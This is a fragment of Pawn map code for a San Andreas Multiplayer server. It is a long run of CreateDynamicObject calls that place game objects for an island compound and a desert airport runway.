CreateDynamicObject(8149, 3242.39990, -5202.00000, 21.90000,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(12814, 3077.00000, -5255.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3077.00000, -5205.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3077.00000, -5155.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3107.00000, -5105.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3137.00000, -5105.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3167.00000, -5105.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3197.00000, -5105.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3227.00000, -5105.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3257.00000, -5105.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3107.00000, -5155.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3107.00000, -5205.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3107.00000, -5255.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3107.00000, -5305.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3077.00000, -5105.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3137.00000, -5155.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3167.00000, -5155.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3197.00000, -5155.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3227.00000, -5155.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3257.00000, -5155.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3167.00000, -5205.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3197.00000, -5205.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3227.00000, -5205.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3257.00000, -5205.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3137.00000, -5255.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3167.00000, -5255.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3197.00000, -5255.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3227.00000, -5255.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3257.00000, -5255.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3137.00000, -5305.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3167.00000, -5305.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3197.00000, -5305.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3227.00000, -5305.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3257.00000, -5305.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(16113, 3248.00000, -5098.70020, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(16113, 3214.39990, -5091.20020, 17.20000,   0.00000, 0.00000, 212.00000);
CreateDynamicObject(16113, 3305.80005, -5250.70020, 25.30000,   0.00000, 0.00000, 122.00000);
CreateDynamicObject(16113, 3159.00000, -5093.10010, 17.20000,   0.00000, 0.00000, 212.00000);
CreateDynamicObject(16113, 3119.30005, -5100.00000, 17.20000,   0.00000, 0.00000, 22.00000);
CreateDynamicObject(16113, 3079.10010, -5107.00000, 17.20000,   0.00000, 0.00000, 63.99000);
CreateDynamicObject(16113, 3061.19995, -5131.70020, 17.20000,   0.00000, 0.00000, 309.98999);
CreateDynamicObject(16116, 3062.80005, -5178.70020, 17.70000,   0.00000, 0.00000, 312.00000);
CreateDynamicObject(16116, 3059.30005, -5221.00000, 17.70000,   0.00000, 0.00000, 312.00000);
CreateDynamicObject(16116, 3071.80005, -5271.29980, 12.70000,   0.00000, 0.00000, 130.00000);
CreateDynamicObject(16116, 3075.89990, -5301.10010, 17.70000,   0.00000, 0.00000, 355.98999);
CreateDynamicObject(866, 3088.10010, -5243.00000, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(866, 3087.80005, -5240.29980, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3077.00000, -5255.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3077.00000, -5255.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3077.00000, -5255.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3077.00000, -5255.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3077.00000, -5255.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(16206, 3102.10010, -5398.79980, 65.10000,   0.00000, 0.00000, 248.00000);
CreateDynamicObject(16206, 3182.69995, -5396.60010, 78.40000,   0.00000, 0.00000, 248.00000);
CreateDynamicObject(16116, 3106.10010, -5313.10010, 17.70000,   0.00000, 0.00000, 43.99000);
CreateDynamicObject(16116, 3146.89990, -5309.00000, 17.70000,   0.00000, 0.00000, 43.99000);
CreateDynamicObject(16116, 3180.19995, -5305.20020, 17.70000,   0.00000, 0.00000, 43.99000);
CreateDynamicObject(16116, 3222.60010, -5306.50000, 17.70000,   0.00000, 0.00000, 43.99000);
CreateDynamicObject(16258, 3285.50000, -5240.70020, 61.00000,   0.00000, 0.00000, 96.00000);
CreateDynamicObject(16097, 3336.00000, -5134.89990, 36.40000,   0.00000, 0.00000, 40.00000);
CreateDynamicObject(16113, 3259.60010, -5115.79980, 18.90000,   0.00000, 0.00000, 94.00000);
CreateDynamicObject(16113, 3195.69995, -5093.70020, 17.20000,   0.00000, 0.00000, 212.00000);
CreateDynamicObject(16113, 3309.00000, -5219.50000, 25.30000,   0.00000, 0.00000, 121.99000);
CreateDynamicObject(3279, 3227.00000, -5267.39990, 18.70000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3279, 3227.00000, -5140.50000, 18.70000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3279, 3102.30005, -5140.50000, 18.70000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3279, 3102.30005, -5269.39990, 18.70000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(16093, 3227.19995, -5166.70020, 23.10000,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(16638, 3226.22998, -5166.79004, 21.30000,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(16093, 3227.19995, -5244.79980, 23.10000,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(16638, 3226.21997, -5244.89014, 21.30000,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(16093, 3103.00000, -5166.70020, 23.10000,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(16638, 3103.97998, -5166.62012, 21.30000,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(11292, 3121.50000, -5144.50000, 20.30000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(11292, 3132.50000, -5144.50000, 20.30000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(11292, 3143.50000, -5144.50000, 20.30000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(11292, 3121.50000, -5153.60010, 20.30000,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(11292, 3132.50000, -5153.60010, 20.30000,   0.00000, 0.00000, 179.99001);
CreateDynamicObject(11292, 3143.50000, -5153.60010, 20.30000,   0.00000, 0.00000, 179.99001);
CreateDynamicObject(12919, 3166.89990, -5148.00000, 18.80000,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(3866, 3203.60010, -5156.60010, 26.60000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3887, 3222.10010, -5207.60010, 27.70000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(11088, 3180.69995, -5212.39990, 24.32002,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(12814, 3156.39990, -5205.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3117.39990, -5205.60010, 18.89000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12814, 3133.69995, -5214.20020, 18.87000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3095, 3136.89990, -5193.08008, 13.77000,   20.00000, 0.00000, 0.00000);
CreateDynamicObject(3095, 3136.89990, -5184.64014, 16.85000,   20.00000, 0.00000, 0.00000);
CreateDynamicObject(3095, 3141.80005, -5185.10010, 15.10000,   0.00000, 270.00000, 0.00000);
CreateDynamicObject(3095, 3132.10010, -5185.10010, 15.10000,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(3095, 3141.80005, -5193.10010, 14.37000,   0.00000, 270.00000, 0.00000);
CreateDynamicObject(3095, 3132.10010, -5193.10010, 14.37000,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(3095, 3136.89990, -5193.70020, 18.31000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 3137.00000, -5207.39990, 12.77000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 3137.00000, -5207.39990, 18.40000,   180.00000, 0.00000, 0.00000);
CreateDynamicObject(16665, 3162.51001, -5215.22998, 12.76000,   0.00000, 0.00000, 179.99001);
CreateDynamicObject(8661, 3117.10010, -5207.39990, -1.50000,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(8661, 3137.00000, -5217.37012, 8.41000,   270.00000, 0.00000, 0.00000);
CreateDynamicObject(8661, 3157.00000, -5202.89990, -1.50000,   0.00000, 270.00000, 0.00000);
CreateDynamicObject(3117, 3156.39990, -5215.60010, 17.80000,   90.00000, 0.00000, 90.00000);
CreateDynamicObject(3117, 3156.39990, -5215.60010, 16.20000,   90.00000, 0.00000, 90.00000);
CreateDynamicObject(3117, 3156.69995, -5212.89990, 16.90000,   0.00000, 90.00000, 343.00000);
CreateDynamicObject(8661, 3122.19995, -5197.60010, -1.50000,   0.00000, 90.00000, 270.00000);
CreateDynamicObject(8661, 3151.50000, -5197.60010, -1.50000,   0.00000, 90.00000, 270.00000);
CreateDynamicObject(2917, 3134.80005, -5216.39990, 17.80000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(16641, 3125.69995, -5207.89990, 14.50000,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(2917, 3139.39990, -5216.39990, 17.80000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(16666, 3134.30005, -5211.70020, 7.70000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3066, 3152.69995, -5203.60010, 13.80000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2974, 3149.19995, -5199.50000, 12.80000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2974, 3146.80005, -5199.50000, 12.80000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2974, 3144.39990, -5199.50000, 12.80000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2974, 3144.39990, -5203.39990, 12.80000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2974, 3146.80005, -5203.39990, 12.80000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2974, 3149.19995, -5203.39990, 12.80000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(925, 3146.00000, -5216.10010, 13.80000,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(930, 3146.10010, -5216.00000, 15.30000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3576, 3149.69995, -5215.79980, 14.20000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1225, 3144.19995, -5216.10010, 13.20000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3786, 3139.60010, -5216.50000, 15.00000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3786, 3134.89990, -5216.39990, 15.00000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3787, 3139.69995, -5216.70020, 13.30000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3787, 3134.69995, -5216.70020, 13.30000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3795, 3139.80005, -5214.50000, 13.10000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3795, 3134.39990, -5214.39990, 13.10000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(16662, 3173.89990, -5215.60010, 13.00000,   0.00000, 0.00000, 244.00000);
CreateDynamicObject(16782, 3175.69995, -5215.00000, 14.10000,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(3384, 3171.50000, -5221.50000, 13.20000,   0.00000, 0.00000, 312.00000);
CreateDynamicObject(3383, 3166.10010, -5219.70020, 11.70000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3393, 3165.30005, -5211.10986, 11.75000,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(2934, 3154.68994, -5164.31982, 20.32000,   0.00000, 0.00000, -10.32000);
CreateDynamicObject(3887, 3184.16919, -5264.73584, 27.70000,   0.00000, 0.00000, -109.61999);
CreateDynamicObject(8075, 3105.93408, -5190.02783, 22.82673,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(7561, 3109.89844, -5233.28418, 24.67392,   0.00000, 0.00000, -179.64006);
CreateDynamicObject(12919, 3137.30664, -5245.42285, 18.80000,   0.00000, 0.00000, 119.03999);
//Desert Airport
CreateDynamicObject(18981, 424.24030, 2517.47192, 15.09740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 424.32480, 2488.56299, 14.99740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 424.25897, 2503.60962, 15.11740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 399.24161, 2516.28711, 15.09740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 374.24301, 2516.29248, 15.09740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 374.71140, 2529.88403, 15.03740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 349.56873, 2516.85303, 15.09740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 324.66425, 2516.70776, 15.09740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 301.61749, 2517.02002, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 325.93723, 2529.76416, 15.27740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 276.85614, 2517.15503, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 251.95728, 2516.80469, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 227.08116, 2516.75464, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 202.27521, 2516.75024, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 177.32695, 2516.76147, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 152.32205, 2516.75854, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 127.36066, 2516.73218, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 102.42180, 2516.12402, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 77.48590, 2516.14478, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 52.54224, 2516.15259, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 27.19204, 2515.98584, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 1.88092, 2516.03687, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, -22.97487, 2516.47437, 15.13933,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, -47.38760, 2516.20605, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, -72.38720, 2516.22949, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 399.25311, 2488.94019, 14.99740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 374.51318, 2488.13452, 14.99740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 349.61481, 2487.70361, 14.97740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 324.60733, 2487.64038, 14.97740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 299.58139, 2487.62524, 14.97740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 274.74692, 2487.60742, 14.97740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 249.89096, 2487.59424, 14.97740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 224.92644, 2487.58936, 14.97740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 200.04915, 2487.56128, 14.97740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 175.10326, 2487.55640, 14.97740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 150.11371, 2487.48560, 14.97740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 125.13631, 2487.46826, 14.97740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 100.47751, 2487.39844, 14.97740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 75.44420, 2487.41968, 14.97740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 50.55295, 2487.44482, 14.97740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 25.88000, 2488.41650, 14.99740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 0.87027, 2487.43018, 14.97740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, -24.15084, 2487.38110, 14.93987,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, -49.21090, 2487.38452, 14.97740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, -74.11914, 2487.37280, 14.97740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, -72.33500, 2491.23828, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, -72.25986, 2488.91211, 15.27740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, -47.32240, 2491.21899, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, -22.33432, 2491.49097, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 2.65560, 2491.09839, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 27.69630, 2491.08667, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 52.58120, 2491.15479, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 77.54566, 2491.17822, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 102.50820, 2491.13794, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 127.22237, 2491.72388, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 152.10381, 2491.75000, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 176.81320, 2491.75366, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 201.88300, 2491.76660, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 226.88770, 2491.83667, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 251.79141, 2491.81104, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 276.75690, 2492.15698, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 302.02927, 2492.19238, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 326.82440, 2492.03931, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 351.70859, 2491.88062, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 376.58627, 2491.70068, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 401.23572, 2491.29639, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 448.48306, 2516.74146, 15.11740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 296.61972, 2492.18188, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(18981, 399.49301, 2486.50366, 14.97740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(3578, 419.14719, 2502.67090, 14.84560,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3578, 388.92053, 2502.73315, 15.02560,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3578, 359.06696, 2502.68994, 15.02560,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3578, 328.98062, 2502.70703, 15.02560,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3578, 299.17850, 2502.77441, 15.02560,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3578, 268.94034, 2502.71069, 15.02560,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3578, 238.92776, 2502.73779, 15.02560,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3578, 208.89989, 2502.76001, 15.02560,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18981, 186.43629, 2496.15942, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(3578, 178.90758, 2502.74438, 15.02560,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3578, 148.83640, 2502.73999, 15.02560,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3578, 118.53752, 2502.77295, 15.02560,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3578, 88.44008, 2502.73999, 15.02560,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3578, 58.39502, 2502.74243, 15.02560,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3578, 28.41180, 2502.74512, 15.02560,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18981, 10.39278, 2496.25732, 15.29740,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(3578, -1.71240, 2502.79688, 15.02560,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3578, -31.62419, 2502.82837, 15.02560,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3578, -52.06635, 2513.94214, 15.02560,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3578, -62.33321, 2513.94336, 15.02560,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3578, -52.00258, 2501.64111, 15.02560,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3578, -47.26891, 2509.03516, 15.02560,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(3578, -67.19199, 2508.99707, 15.02560,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(3578, -57.24138, 2508.99561, 15.02560,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(3578, -62.20953, 2504.10474, 15.02560,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3578, -52.02301, 2491.81836, 15.02560,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3578, -62.17576, 2491.79834, 15.02560,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3578, -67.14832, 2496.79370, 15.02560,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(3578, -47.14150, 2496.78442, 15.02560,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(3578, -56.92606, 2496.74390, 15.02560,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19372, 431.61761, 2541.22510, 15.06950,   0.00000, 90.00000, 359.69699);
CreateDynamicObject(19372, 435.10321, 2541.20850, 15.06950,   0.00000, 90.00000, 359.69699);
CreateDynamicObject(19372, 438.60330, 2541.18433, 15.06950,   0.00000, 90.00000, 359.69699);
CreateDynamicObject(19372, 442.10300, 2541.16040, 15.06950,   0.00000, 90.00000, 359.69699);
CreateDynamicObject(19372, 431.63632, 2544.43188, 15.06950,   0.00000, 90.00000, 359.69699);
CreateDynamicObject(19372, 431.64139, 2547.63672, 15.06950,   0.00000, 90.00000, 359.69699);
CreateDynamicObject(19372, 431.64536, 2550.85132, 15.06950,   0.00000, 90.00000, 359.69699);
CreateDynamicObject(19372, 431.66010, 2554.05225, 15.06950,   0.00000, 90.00000, 359.69699);
CreateDynamicObject(19372, 441.41345, 2544.35962, 15.06950,   0.00000, 90.00000, 359.69699);
CreateDynamicObject(19372, 441.44623, 2547.55640, 15.06950,   0.00000, 90.00000, 359.69699);
CreateDynamicObject(19372, 441.46930, 2550.75684, 15.06950,   0.00000, 90.00000, 359.69699);
CreateDynamicObject(19372, 441.47229, 2553.95947, 15.06950,   0.00000, 90.00000, 359.69699);
CreateDynamicObject(19372, 437.93716, 2544.38965, 15.06950,   0.00000, 90.00000, 359.69699);
CreateDynamicObject(19372, 434.67068, 2544.39038, 15.04950,   0.00000, 90.00000, 359.69699);
CreateDynamicObject(19372, 437.95511, 2547.59473, 15.06950,   0.00000, 90.00000, 359.69699);
CreateDynamicObject(19372, 437.97299, 2550.80396, 15.06950,   0.00000, 90.00000, 359.69699);
CreateDynamicObject(19372, 437.99857, 2554.01025, 15.06950,   0.00000, 90.00000, 359.69699);
CreateDynamicObject(19372, 434.96426, 2547.59180, 15.04950,   0.00000, 90.00000, 359.69699);
CreateDynamicObject(19372, 434.83795, 2550.79517, 15.04950,   0.00000, 90.00000, 359.69699);
CreateDynamicObject(19372, 434.79211, 2553.99780, 15.06950,   0.00000, 90.00000, 359.69699);
CreateDynamicObject(10763, 437.28644, 2538.07520, 28.19513,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19381, 425.14450, 2544.33936, 15.52720,   0.00000, 90.00000, 89.58001);
CreateDynamicObject(19381, 425.09714, 2533.97925, 15.58720,   0.00000, 90.00000, 89.82001);
CreateDynamicObject(19381, 415.47681, 2533.96875, 15.54720,   0.00000, 90.00000, 89.82000);
CreateDynamicObject(19372, 431.05466, 2551.69189, 15.08950,   0.00000, 90.00000, 359.69699);
CreateDynamicObject(19381, 396.34161, 2533.99341, 15.54720,   0.00000, 90.00000, 89.82000);
CreateDynamicObject(19381, 415.52484, 2544.40698, 15.52720,   0.00000, 90.00000, 89.58001);
CreateDynamicObject(19381, 425.22467, 2552.85645, 15.50720,   0.00000, 90.00000, 89.82000);
CreateDynamicObject(19381, 425.22467, 2552.85645, 15.29595,   0.00000, 90.00000, 89.82000);
CreateDynamicObject(19381, 425.14450, 2544.33936, 15.35810,   0.00000, 90.00000, 89.58000);
CreateDynamicObject(19381, 425.14331, 2535.50122, 15.35810,   0.00000, 90.00000, 89.58000);
CreateDynamicObject(19381, 425.09680, 2531.62085, 15.45810,   0.00000, 90.00000, 89.58000);
CreateDynamicObject(19381, 415.61365, 2552.91431, 15.50720,   0.00000, 90.00000, 89.82000);
CreateDynamicObject(19381, 415.61359, 2552.91431, 15.50120,   0.00000, 90.00000, 89.82000);
CreateDynamicObject(19381, 405.99332, 2552.87769, 15.50720,   0.00000, 90.00000, 89.82000);
CreateDynamicObject(19381, 396.40244, 2552.89478, 15.50720,   0.00000, 90.00000, 89.82000);
CreateDynamicObject(19381, 396.37579, 2542.54834, 15.52720,   0.00000, 90.00000, 89.82000);
CreateDynamicObject(19377, 405.86938, 2543.57813, 15.56000,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(19387, 405.63959, 2538.80103, 17.37850,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19449, 394.52020, 2543.66309, 17.38430,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19377, 399.69958, 2543.66772, 15.58000,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(19403, 396.02802, 2538.78076, 17.39470,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19403, 399.23999, 2538.78467, 17.39470,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19403, 402.44040, 2538.78687, 17.39470,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19403, 408.83850, 2538.79736, 17.37470,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19377, 408.39270, 2543.69336, 15.58000,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(19403, 412.04449, 2538.78955, 17.37470,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19403, 394.49631, 2550.08691, 17.39470,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19377, 399.84573, 2546.84375, 15.56000,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(19377, 408.38519, 2546.83594, 15.54000,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(19449, 413.52917, 2543.63623, 17.38430,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19403, 413.53699, 2550.06470, 17.39470,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19449, 408.78683, 2551.61035, 17.38430,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19449, 399.24374, 2551.61328, 17.38430,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19377, 399.69958, 2543.52759, 22.37600,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(3851, 400.09909, 2538.76611, 20.28360,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(3851, 407.96051, 2538.73877, 20.28360,   0.00000, 0.00000, -90.00000);
